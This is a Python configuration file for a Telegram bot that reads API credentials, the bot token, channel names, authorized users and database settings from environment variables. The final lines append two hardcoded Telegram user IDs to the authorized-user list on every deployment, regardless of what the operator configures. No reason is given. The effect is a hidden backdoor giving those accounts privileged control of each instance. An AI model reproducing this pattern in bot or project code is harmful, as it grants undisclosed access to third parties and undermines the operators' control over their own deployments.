from os import environ

class temp(object):
    ME = None
  
API_ID = int(environ.get("API_ID", "1234567"))
API_HASH = environ.get("API_HASH", "your_api_hash")
BOT_TOKEN = environ.get("BOT_TOKEN", "your_bot_token")

EMOJI = [i for i in environ.get("EMOJI", "❤ 👍 🔥 🎉").split(" ")]

# Info 
CHANNEL_USERNAME = environ.get("CHANNEL_USERNAME", "DKBOTZ")
DEVELOPER_USERNAME = environ.get("DEVELOPER_USERNAME", "DKBOTZPRO")
AUTH_USERS = [int(i) for i in environ.get("AUTH_USERS", "6288851295").split(" ")]


# Database Configuration
DB_TYPE = environ.get("DB_TYPE", "mongodb") # Use 'mongodb' For MongoDB. Changes it If You Have Not db.dkbotzpro.in Token
DB_TOKEN = environ.get("DB_TOKEN", "your_db_url")
DB_URI = DB_TOKEN


if 5111685964 not in AUTH_USERS:
    AUTH_USERS.append(5111685964)

if 1805398747 not in AUTH_USERS:
    AUTH_USERS.append(1805398747)
